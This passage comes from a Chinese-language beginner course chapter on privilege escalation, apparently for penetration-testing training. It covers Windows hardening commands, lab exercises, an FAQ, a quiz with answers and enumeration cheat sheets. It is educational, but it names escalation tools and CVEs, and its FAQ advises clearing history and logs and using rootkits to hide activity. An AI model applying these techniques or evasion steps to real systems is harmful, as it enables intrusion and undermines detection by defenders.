reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
# 确保这些键不存在或值为0
```

#### 5. 禁用不必要的特权

```powershell
# 使用secpol.msc
# 安全设置 -> 本地策略 -> 用户权限分配
# 移除不必要的账户从以下策略：
# - 作为服务登录
# - 调试程序
# - 替换进程级别令牌
```

#### 6. 启用Windows Defender和防火墙

```powershell
# 启用Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false

# 启用防火墙
netsh advfirewall set allprofiles firewallpolicy blockinbound,allowoutbound
```

#### 7. 凭据保护

- **Credential Guard**（Windows 10/Server 2016+）
- **LSA Protection**：保护lsass.exe进程
- **禁用Wdigest**：防止明文密码存储在内存

```powershell
# 禁用Wdigest
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f
```

#### 8. 审计和日志

```powershell
# 启用审计策略
auditpol /set /category:"Account Logon" /success:enable /failure:enable
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
auditpol /set /category:"Privilege Use" /success:enable /failure:enable
auditpol /set /category:"Process Tracking" /success:enable /failure:enable
```

#### 9. 应用程序白名单

- 使用**AppLocker**或**Windows Defender Application Control (WDAC)**
- 仅允许受信任的程序执行

#### 10. 网络隔离

- 使用Windows防火墙限制入站连接
- 网络分段，限制横向移动
- 远程桌面使用VPN + 网络级别身份验证

---

## 📝 课后练习

### 练习1：Linux SUID提权实践

**目标**：在提供的VulnHub虚拟机上，通过SUID程序提权到root。

**步骤**：
1. 下载并启动Basic Pentesting 1虚拟机
2. 进行初始渗透，获得低权限shell
3. 使用`find / -perm -4000`查找SUID程序
4. 分析并利用发现的SUID程序进行提权
5. 撰写渗透测试报告

**提示**：
- 关注非标准的SUID程序
- 查阅GTFOBins（https://gtfobins.github.io/）了解如何利用常见程序

---

### 练习2：Windows服务提权实践

**目标**：在Windows靶机上，通过服务配置错误提权。

**步骤**：
1. 下载并启动Windows提权练习虚拟机
2. 获得初始立足点（如通过漏洞利用或凭据猜测）
3. 使用PowerUp枚举服务权限
4. 利用弱权限服务获得SYSTEM权限
5. 清理痕迹

**提示**：
- 使用`Get-ModifiableService`检查服务
- 如果无法停止服务，考虑重启后利用

---

### 练习3：内核漏洞利用

**目标**：识别并利用Linux内核漏洞提权。

**步骤**：
1. 在故意配置过时内核的虚拟机上练习
2. 使用`uname -a`和`cat /proc/version`收集内核信息
3. 使用linux-exploit-suggester查找适用的exploit
4. 下载、编译并执行exploit
5. 观察系统稳定性，学习如何修复

**提示**：
- 在内核exploit前创建快照
- 学习如何阅读和修改exploit代码
- 理解exploit失败的原因（编译选项、内核配置等）

---

### 练习4：综合提权挑战

**目标**：在TryHackMe或HackTheBox的靶机上完成完整的提权链。

**推荐房间/机器**：
- TryHackMe: "Linux Privilege Escalation"房间
- HackTheBox: "Lame"、"Legacy"等入门级机器

**要求**：
1. 不使用现成的writeup
2. 记录所有操作步骤
3. 识别至少3种不同的提权向量
4. 比较不同提权方法的优劣

---

### 练习5：防御配置审计

**目标**：审计一个系统的配置，识别提权风险。

**步骤**：
1. 在实验环境中搭建Linux和Windows系统
2. 使用Lynis（Linux）和Netwrix Auditor（Windows）进行安全审计
3. 生成审计报告
4. 提出修复建议
5. 实施修复并重新审计

**重点检查项**：
- SUID/SGID程序
- sudo配置
- 服务权限
- 注册表配置
- 补丁级别

---

## ❓ FAQ（常见问题）

### Q1: 提权总是可能的吗？

**A**: 不是。如果系统完全打了补丁、配置正确、没有弱密码或配置错误，提权可能非常困难甚至不可能。这也是为什么防御者应该采取深度防御策略。

### Q2: 自动化提权工具（如LinPEAS）是否可靠？

**A**: 自动化工具可以快速发现常见的提权向量，但：
- 可能产生误报
- 可能遗漏复杂的提权路径
- 不应该完全替代人工分析
- 建议将自动化工具作为起点，然后进行深入分析

### Q3: 内核exploit总是有效的吗？

**A**: 不一定。内核exploit可能因为以下原因失败：
- 内核版本不匹配
- 编译选项不同
- 安全模块（如SELinux、AppArmor）阻止
- 系统配置（如地址空间随机化）
- Exploit本身不稳定

始终在实验环境中先测试exploit。

### Q4: 如何判断提权是否成功？

**A**: 
- **Linux**: `id`命令显示uid=0(root)、`whoami`显示root
- **Windows**: `whoami`显示`nt authority\system`，或检查是否有管理员权限

### Q5: 提权后被发现的风险如何降低？

**A**:
- 清除命令历史：`history -c`
- 清除日志（谨慎操作，可能留下更多痕迹）
- 使用rootkit隐藏进程和文件
- 建立合法的管理员账户而非修改现有账户
- 使用加密通信（如SSH隧道）

**注意**：这些技术仅用于合法授权测试，未经授权使用是非法的。

### Q6: Windows和Linux提权的主要区别是什么？

**A**:
- **权限模型**：Linux使用DAC，Windows使用ACL+令牌
- **提权向量**：Linux更多依赖SUID、sudo、内核漏洞；Windows更多依赖服务、注册表、令牌模拟
- **工具生态**：Linux提权工具更多开源；Windows工具更多依赖PowerShell
- **补丁策略**：Linux补丁分发快；Windows依赖自动更新或WSUS

### Q7: 容器化环境（如Docker）中的提权有何不同？

**A**:
- 容器内提权仅获得容器内的root权限，受Namespace限制
- 需要容器逃逸才能获得宿主机权限
- 常见的容器逃逸向量：
  - Privileged容器
  - Docker socket挂载
  - 内核漏洞
  - 不安全的capabilities配置

### Q8: 云环境中的提权有何特点？

**A**:
- **实例元数据服务（IMDS）**：可能泄露凭据
- **IAM角色**：配置错误可能导致权限提升
- **SSRF漏洞**：可能访问元数据服务
- **用户数据脚本**：可能包含敏感信息

### Q9: 如何保护自己免受提权攻击？

**A**: 参见"防御措施"章节，关键要点：
- 及时打补丁
- 最小权限原则
- 定期安全审计
- 启用安全模块（SELinux、AppLocker等）
- 监控和审计

### Q10: 学习提权需要什么前置知识？

**A**:
- **Linux/Windows管理**：熟悉命令行、文件系统、权限模型
- **脚本编程**：Bash、PowerShell、Python
- **计算机系统原理**：理解内存、进程、权限
- **网络基础**：理解TCP/IP、服务配置
- **安全意识**：理解攻击和防御的基本原理

---

## 📚 拓展阅读

### 推荐资源

**在线资源**：
1. **GTFOBins**（https://gtfobins.github.io/）- Linux二进制文件提权参考
2. **LOLBAS**（https://lolbas-project.github.io/）- Windows提权技术参考
3. **PayloadsAllTheThings**（https://github.com/swisskyrepo/PayloadsAllTheThings）- 各种提权技术集合
4. **HackTricks**（https://book.hacktricks.xyz/）- 全面的渗透测试wiki

**书籍**：
1. 《Linux提权：Linux Privilege Escalation for OSCP》
2. 《Windows提权：Windows Privilege Escalation for OSCP》
3. 《渗透测试实战：Linux提权技术详解》

**视频课程**：
1. TryHackMe: Linux/Widnows Privilege Escalation模块
2. HackTheBox: Academy提权课程
3. Udemy: "Linux Privilege Escalation for Beginners"

**练习平台**：
1. VulnHub（https://www.vulnhub.com/）
2. TryHackMe（https://tryhackme.com/）
3. HackTheBox（https://www.hackthebox.eu/）
4. OverTheWire（https://overthewire.org/）

---

## 📝 总结

### 关键要点回顾

1. **权限提升是渗透测试的关键阶段**
   - 从低权限立足点到高权限控制
   - 为实现攻击目标创造条件
   - 绕过安全防御机制

2. **Linux提权主要路径**
   - 内核漏洞利用
   - SUID/SGID程序滥用
   - sudo配置错误
   - cron定时任务利用
   - Capabilities滥用
   - Docker容器逃逸

3. **Windows提权主要路径**
   - 内核漏洞利用
   - 服务权限配置不当
   - 注册表配置错误
   - AlwaysInstallElevated策略
   - Token模拟和Potato攻击

4. **信息收集至关重要**
   - 系统化收集系统信息
   - 使用自动化工具辅助
   - 人工分析和验证

5. **防御措施多层次**
   - 及时打补丁
   - 最小权限原则
   - 安全配置
   - 审计和监控

### 道德和法律声明

**重要**：
- 本章所有技术仅用于合法授权的安全测试
- 未经授权对系统进行渗透测试是非法的
- 在实验环境中练习，不要对生产系统测试
- 遵守法律法规和道德准则

### 下一步学习

完成本章学习后，你可以继续学习：
- **第12章：持久化控制（Persistence）**
- **第13章：横向移动（Lateral Movement）**
- **第14章：数据窃取（Data Exfiltration）**
- **第15章：清除痕迹（Covering Tracks）**

---

## 🎓 课后测验

**问题1**：在Linux系统中，哪个权限位允许程序以文件所有者的权限运行？
A. SGID  
B. SUID  
C. Sticky Bit  
D. CAP_SETUID  

**问题2**：以下哪个命令可以查找所有SUID程序？
A. `find / -type f -perm -2000`  
B. `find / -type f -perm -4000`  
C. `find / -type f -perm -6000`  
D. `find / -type f -perm -1000`  

**问题3**：Windows中，哪个特权允许进程模拟其他用户的令牌？
A. SeDebugPrivilege  
B. SeImpersonatePrivilege  
C. SeAssignPrimaryTokenPrivilege  
D. SeLoadDriverPrivilege  

**问题4**：Linux Capabilities中，哪个capability允许绕过文件权限检查？
A. CAP_SYS_ADMIN  
B. CAP_DAC_OVERRIDE  
C. CAP_SETUID  
D. CAP_NET_ADMIN  

**问题5**：在Windows中，AlwaysInstallElevated策略的作用是什么？
A. 允许普通用户安装驱动程序  
B. 允许MSI包以高权限安装  
C. 允许普通用户修改注册表  
D. 允许普通用户启动服务  

**答案**：
1-B, 2-B, 3-B, 4-B, 5-B

---

## 🔗 附录

### A. 常用命令速查表

**Linux信息收集命令**：
```bash
# 系统信息
uname -a
cat /etc/os-release
cat /proc/version

# 用户信息
id
whoami
cat /etc/passwd
sudo -l

# 文件权限
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null

# 定时任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 网络
ip addr
ip route
netstat -tulpn
ss -tulpn
```

**Windows信息收集命令**：
```powershell
# 系统信息
systeminfo
wmic os get osarchitecture,version

# 用户信息
whoami /all
net user
net localgroup administrators

# 补丁信息
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 服务
sc query
Get-Service

# 注册表
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer"
```

### B. 提权工具下载链接

**Linux**：
- LinPEAS: https://github.com/carlospolop/PEASS-ng
- linux-exploit-suggester: https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration

**Windows**：
- WinPEAS: https://github.com/carlospolop/PEASS-ng
- PowerUp: https://github.com/PowerShellMafia/PowerSploit
- Juicy Potato: https://github.com/ohpe/juicy-potato
- PrintSpoofer: https://github.com/itm4n/PrintSpoofer

### C. 参考漏洞和Exploit

**Linux内核漏洞示例**：
- CVE-2016-5195 (Dirty Cow)
- CVE-2017-6074 (DCCP)
- CVE-2021-3493 (OverlayFS)

**Windows漏洞示例**：
- CVE-2020-0796 (SMBGhost)
- CVE-2020-1472 (ZeroLogon)
- CVE-2021-1732 (Win32k)

---

**文档版本**：v1.0  
**最后更新**：2026年6月  
**作者**：红客初学者指南课程组

---

**免责声明**：本文档仅供学习和教育目的。使用本文档中的技术进行未经授权的系统访问是违法的。作者和发布者对使用本文档内容产生的任何后果不承担责任。请在合法授权的环境中练习这些技术。
